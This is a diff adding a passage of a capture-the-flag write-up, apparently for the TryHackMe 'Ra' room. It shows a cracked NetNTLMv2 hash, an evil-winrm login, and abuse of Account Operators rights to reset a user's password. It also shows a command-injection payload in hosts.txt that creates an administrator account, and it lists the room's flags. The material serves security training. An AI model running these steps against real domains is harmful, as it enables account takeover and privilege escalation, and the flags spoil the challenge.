@@ -1236,3 +1236,622 @@ Cracking performance lower than expected?
   https://hashcat.net/faq/morework
 
 BUSE::WINDCORP:df6b0be31e96d0aa:e983e1ef51ac507cbba7409acfa9627b:01010000000000006aab80949afed80133a8c26ca15c55710000000002000800590055005200300001001e00570049004e002d004700510045003800560057005a0049003900390042000400140059005500520030002e004c004f00430041004c0003003400570049004e002d004700510045003800560057005a0049003900390042002e0059005500520030002e004c004f00430041004c000500140059005500520030002e004c004f00430041004c000800300030000000000000000100000000200000dfd055bb82e5cf4cf0f8e3a59d4f0d7d6fe770c6fe68ac5d04ed6a92644ed6ca0a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: BUSE::WINDCORP:df6b0be31e96d0aa:e983e1ef51ac507cbba...000000
+Time.Started.....: Tue Nov 22 12:53:25 2022 (9 secs)
+Time.Estimated...: Tue Nov 22 12:53:34 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   488.0 kH/s (1.20ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2959360/14344385 (20.63%)
+Rejected.........: 0/2959360 (0.00%)
+Restore.Point....: 2958336/14344385 (20.62%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: v&pixs -> uyab_cakep
+Hardware.Mon.#1..: Util: 54%
+
+Started: Tue Nov 22 12:52:38 2022
+Stopped: Tue Nov 22 12:53:36 2022
+
+now using credentials to login with Evil-WinRm
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\buse\Documents> ls
+*Evil-WinRM* PS C:\Users\buse\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\buse\Desktop> ls
+
+    Directory: C:\Users\buse\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/7/2020   3:00 AM                Also stuff
+d-----         5/7/2020   2:58 AM                Stuff
+-a----         5/2/2020  11:53 AM             45 Flag 2.txt
+-a----         5/1/2020   8:33 AM             37 Notes.txt
+
+*Evil-WinRM* PS C:\Users\buse\Desktop> type 'Flag 2.txt'
+THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
+*Evil-WinRM* PS C:\Users\buse\Desktop> type Notes.txt
+I really should be better at taking n
+*Evil-WinRM* PS C:\Users\buse\Desktop> cd Stuff
+*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff> ls
+
+    Directory: C:\Users\buse\Desktop\Stuff
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/7/2020   2:58 AM                Passwords
+
+*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff> cd Passwords
+*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> ls
+
+    Directory: C:\Users\buse\Desktop\Stuff\Passwords
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/7/2020   2:58 AM              8 Facebook.txt
+
+*Evil-WinRM* PS C:\Users\buse\Desktop\Stuff\Passwords> type Facebook.txt
+password
+*Evil-WinRM* PS C:\Users\buse> cd ..
+*Evil-WinRM* PS C:\Users> ls
+
+    Directory: C:\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/10/2020   4:18 AM                Administrator
+d-----         5/1/2020   5:59 AM                angrybird
+d-----         5/1/2020   5:59 AM                berg
+d-----         5/1/2020   5:59 AM                bluefrog579
+d-----         5/2/2020   4:36 PM                brittanycr
+d-----         5/1/2020   5:59 AM                brownostrich284
+d-----       11/22/2022   8:29 AM                buse
+d-----         5/1/2020   5:59 AM                edward
+d-----         5/2/2020   4:30 PM                freddy
+d-----         5/1/2020   5:59 AM                garys
+d-----       11/22/2022   9:56 AM                goldencat416
+d-----         5/1/2020   5:59 AM                goldenwol
+d-----         5/1/2020   5:59 AM                happ
+d-----         5/1/2020   5:59 AM                happyme
+d-----         5/1/2020   5:59 AM                Luis
+d-----         5/1/2020   5:59 AM                orga
+d-----         5/1/2020   5:59 AM                organicf
+d-----       11/22/2022   9:56 AM                organicfish718
+d-----         5/1/2020   5:59 AM                pete
+d-r---        4/30/2020   7:35 AM                Public
+d-----         5/1/2020   5:59 AM                purplecat
+d-----         5/1/2020   5:59 AM                purplepanda
+d-----         5/1/2020   5:59 AM                sadswan
+d-----       11/22/2022   9:59 AM                sadswan869
+d-----         5/1/2020   5:59 AM                sheela
+d-----         5/1/2020   5:59 AM                silver
+d-----         5/1/2020   5:59 AM                smallf
+d-----         5/1/2020   5:59 AM                spiff
+d-----         5/1/2020   5:59 AM                tinygoos
+d-----         5/1/2020   5:59 AM                whiteleopard
+
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> ls
+Access to the path 'C:\Users\Administrator' is denied.
+At line:1 char:1
++ ls
++ ~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+
+*Evil-WinRM* PS C:\Users> cd ..
+*Evil-WinRM* PS C:\> ls
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/2/2020   6:33 AM                inetpub
+d-----        9/15/2018  12:19 AM                PerfLogs
+d-r---         5/8/2020   7:43 AM                Program Files
+d-----         5/7/2020   2:51 AM                Program Files (x86)
+d-----         5/3/2020   5:48 AM                scripts
+d-----        5/29/2020   5:45 PM                Shared
+d-r---         5/2/2020   3:05 PM                Users
+d-----        5/30/2020   7:00 AM                Windows
+
+*Evil-WinRM* PS C:\> cd scripts
+*Evil-WinRM* PS C:\scripts> ls
+
+    Directory: C:\scripts
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         5/3/2020   5:53 AM           4119 checkservers.ps1
+-a----       11/22/2022  10:01 AM             31 log.txt
+
+*Evil-WinRM* PS C:\scripts> cat log.txt
+Last run: 11/22/2022 10:01:15
+*Evil-WinRM* PS C:\scripts> cat checkservers.ps1
+```
+```text
+# reset the lists of hosts prior to looping
+$OutageHosts = $Null
+```
+```text
+# specify the time you want email notifications resent for hosts that are down
+$EmailTimeOut = 30
+```
+```text
+# specify the time you want to cycle through your host lists.
+$SleepTimeOut = 45
+```
+```text
+# specify the maximum hosts that can be down before the script is aborted
+$MaxOutageCount = 10
+```
+```text
+# specify who gets notified
+$notificationto = "brittanycr@windcorp.thm"
+```
+```text
+# specify where the notifications come from
+$notificationfrom = "admin@windcorp.thm"
+```
+```text
+# specify the SMTP server
+$smtpserver = "relay.windcorp.thm"
+```
+```text
+# start looping here
+Do{
+$available = $Null
+$notavailable = $Null
+Write-Host (Get-Date)
+```
+```text
+# Read the File with the Hosts every cycle, this way to can add/remove hosts
+```
+```text
+# from the list without touching the script/scheduled task,
+```
+```text
+# also hash/comment (#) out any hosts that are going for maintenance or are down.
+get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
+ForEach-Object {
+    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
+    Invoke-Expression $p
+if($p)
+    {
+```
+```text
+# if the Host is available then just write it to the screen
+     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
+     [Array]$available += $_
+    }
+else
+    {
+```
+```text
+# If the host is unavailable, give a warning to screen
+     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White
+     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue
+     if(!($p))
+       {
+```
+```text
+# If the host is still unavailable for 4 full pings, write error and send email
+        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White
+        [Array]$notavailable += $_
+
+        if ($OutageHosts -ne $Null)
+            {
+                if (!$OutageHosts.ContainsKey($_))
+                {
+```
+```text
+# First time down add to the list and send email
+                 Write-Host "$_ Is not in the OutageHosts list, first time down"
+                 $OutageHosts.Add($_,(get-date))
+                 $Now = Get-date
+                 $Body = "$_ has not responded for 5 pings at $Now"
+                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
+                  -Subject "Host $_ is down" -SmtpServer $smtpserver
+                }
+                else
+                {
+```
+```text
+# If the host is in the list do nothing for 1 hour and then remove from the list.
+                    Write-Host "$_ Is in the OutageHosts list"
+                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut)
+                    {$OutageHosts.Remove($_)}
+                }
+            }
+        else
+            {
+```
+```text
+# First time down create the list and send email
+                Write-Host "Adding $_ to OutageHosts."
+                $OutageHosts = @{$_=(get-date)}
+                $Body = "$_ has not responded for 5 pings at $Now"
+                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
+                 -Subject "Host $_ is down" -SmtpServer $smtpserver
+            }
+       }
+    }
+}
+```
+```text
+# Report to screen the details
+$log = "Last run: $(Get-Date)"
+write-host $log
+Set-Content -Path C:\scripts\log.txt -Value $log
+Write-Host "Available count:"$available.count
+Write-Host "Not available count:"$notavailable.count
+Write-Host "Not available hosts:"
+$OutageHosts
+Write-Host ""
+Write-Host "Sleeping $SleepTimeOut seconds"
+sleep $SleepTimeOut
+if ($OutageHosts.Count -gt $MaxOutageCount)
+{
+```
+
+## Privilege Escalation
+```text
+# If there are more than a certain number of host down in an hour abort the script.
+    $Exit = $True
+    $body = $OutageHosts | Out-String
+    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
+     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer
+}
+}
+while ($Exit -ne $True)
+
+This takes whatever is in that hosts.txt file in Brittany’s folder and uses Invoke-Expression.
+which tells us that “C:\Users\brittanycr\hosts.txt” is being run/used automatically.
+We need to get access to that hosts.txt file. Let’s check what permissions we have and what groups we’re in.
+
+*Evil-WinRM* PS C:\scripts> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\scripts> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+*Evil-WinRM* PS C:\scripts> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ============================================
+windcorp\buse S-1-5-21-555431066-3599073733-176599750-5777
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+We see that we are part of the Account Operators group that means we can modify all accounts except admin accounts. 
+
+*Evil-WinRM* PS C:\scripts> .\checkservers.ps1
+11/22/2022 10:07:11 AM
+Access is denied
+At C:\scripts\checkservers.ps1:25 char:1
++ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+Cannot find path 'C:\Users\brittanycr\hosts.txt' because it does not exist.
+At C:\scripts\checkservers.ps1:25 char:1
++ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+Last run: 11/22/2022 10:07:12
+Access to the path 'C:\scripts\log.txt' is denied.
+At C:\scripts\checkservers.ps1:81 char:1
++ Set-Content -Path C:\scripts\log.txt -Value $log
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Set-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.SetContentCommand
+Available count: 0
+Not available count: 0
+Not available hosts:
+
+Sleeping 45 seconds
+11/22/2022 10:07:57 AM
+Access is denied
+At C:\scripts\checkservers.ps1:25 char:1
++ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+Cannot find path 'C:\Users\brittanycr\hosts.txt' because it does not exist.
+At C:\scripts\checkservers.ps1:25 char:1
++ get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\brittanycr\hosts.txt:String) [Get-Content], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+Last run: 11/22/2022 10:07:57
+Access to the path 'C:\scripts\log.txt' is denied.
+At C:\scripts\checkservers.ps1:81 char:1
++ Set-Content -Path C:\scripts\log.txt -Value $log
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Set-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.SetContentCommand
+Available count: 0
+Not available count: 0
+Not available hosts:
+
+Sleeping 45 seconds
+
+Since we are part of the Account Operators group let’s reset the password for the account “brittanycr”.
+*Evil-WinRM* PS C:\scripts> net user brittanycr 
+User name                    brittanycr
+Full Name                    Brittany Cruz
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/3/2020 6:15:48 AM
+Password expires             6/14/2020 6:15:48 AM
+Password changeable          5/4/2020 6:15:48 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/3/2020 5:27:42 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\scripts> net user brittanycr witty
+net.exe : The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements.
+    + CategoryInfo          : NotSpecified: (The password do...y requirements.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+
+More help is available by typing NET HELPMSG 2245.
+
+more secure
+
+*Evil-WinRM* PS C:\scripts> net user brittanycr witty123#
+The command completed successfully.
+
+or
+
+*Evil-WinRM* PS C:\scripts> net user brittanycr witty123# /domain
+The command completed successfully.
+
+We can then see we can upload to the hosts.txt file:
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ smbclient //windcorp.thm/users -U brittanycr --password witty123#
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sat May  2 18:05:58 2020
+  ..                                 DR        0  Sat May  2 18:05:58 2020
+  Administrator                       D        0  Sun May 10 07:18:11 2020
+  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
+  angrybird                           D        0  Fri May  1 08:59:20 2020
+  berg                                D        0  Fri May  1 08:59:20 2020
+  bluefrog579                         D        0  Fri May  1 08:59:20 2020
+  brittanycr                          D        0  Sat May  2 19:36:46 2020
+  brownostrich284                     D        0  Fri May  1 08:59:20 2020
+  buse                                D        0  Tue Nov 22 11:29:54 2022
+  Default                           DHR        0  Thu Apr 30 19:35:11 2020
+  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+  edward                              D        0  Fri May  1 08:59:20 2020
+  freddy                              D        0  Sat May  2 19:30:16 2020
+  garys                               D        0  Fri May  1 08:59:20 2020
+  goldencat416                        D        0  Tue Nov 22 13:11:06 2022
+  goldenwol                           D        0  Fri May  1 08:59:20 2020
+  happ                                D        0  Fri May  1 08:59:20 2020
+  happyme                             D        0  Fri May  1 08:59:20 2020
+  Luis                                D        0  Fri May  1 08:59:20 2020
+  orga                                D        0  Fri May  1 08:59:20 2020
+  organicf                            D        0  Fri May  1 08:59:20 2020
+  organicfish718                      D        0  Tue Nov 22 13:11:59 2022
+  pete                                D        0  Fri May  1 08:59:20 2020
+  Public                             DR        0  Thu Apr 30 10:35:47 2020
+  purplecat                           D        0  Fri May  1 08:59:20 2020
+  purplepanda                         D        0  Fri May  1 08:59:20 2020
+  sadswan                             D        0  Fri May  1 08:59:20 2020
+  sadswan869                          D        0  Tue Nov 22 13:11:23 2022
+  sheela                              D        0  Fri May  1 08:59:20 2020
+  silver                              D        0  Fri May  1 08:59:20 2020
+  smallf                              D        0  Fri May  1 08:59:20 2020
+  spiff                               D        0  Fri May  1 08:59:20 2020
+  tinygoos                            D        0  Fri May  1 08:59:20 2020
+  whiteleopard                        D        0  Fri May  1 08:59:20 2020
+
+                15587583 blocks of size 4096. 10909657 blocks available
+smb: \> cd brittanycr
+smb: \brittanycr\> ls
+  .                                   D        0  Sat May  2 19:36:46 2020
+  ..                                  D        0  Sat May  2 19:36:46 2020
+  hosts.txt                           A       22  Sun May  3 09:44:57 2020
+
+                15587583 blocks of size 4096. 10909673 blocks available
+smb: \brittanycr\> more hosts.txt
+getting file \brittanycr\hosts.txt of size 22 as /tmp/smbmore.JyUoq1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+google.com
+cisco.com
+
+so let's upload (put) malicious host
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ echo '; net user WittyAle witty!123 /add; net localgroup Administrators WittyAle /add' > hosts.txt
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ cat hosts.txt   
+; net user WittyAle witty!123 /add; net localgroup Administrators WittyAle /add
+                                                                                  
+
+smb: \brittanycr\> put hosts.txt 
+putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)
+
+let's verify
+smb: \brittanycr\> more hosts.txt 
+getting file \brittanycr\hosts.txt of size 72 as /tmp/smbmore.n1zP8h (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+; net user WittyAle witty!123 /add; net localgroup Administrators WittyAle /add 
+
+verifying
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                       
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\buse\Documents> net user WittyAle
+User name                    WittyAle
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/22/2022 10:27:02 AM
+Password expires             1/3/2023 10:27:02 AM
+Password changeable          11/23/2022 10:27:02 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
+```text
+┌──(kali㉿kali)-[~/ra]
+└─$ evil-winrm -i windcorp.thm -u WittyAle -p 'witty!123'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                       
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\WittyAle\Documents> cat 'C:\users\Administrator\Desktop\Flag3.txt'
+THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
+
+😊
+```
+![[Pasted image 20221122113124.png]]
+![[Pasted image 20221122113139.png]]
+![[Pasted image 20221122123956.png]]
+![[Pasted image 20221122124018.png]]
+![[Pasted image 20221122124525.png]]
+![[Pasted image 20221122124621.png]]
+![[Pasted image 20221122124839.png]]
+Flag 1
+Flag 2
+Flag 3
+
+## Flags / Answers
+- ***THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}***
+- ***THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}***
+- ***THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}***
+
+## Notes / Lessons Learned
+[[PrintNightmare, thrice!]]
+
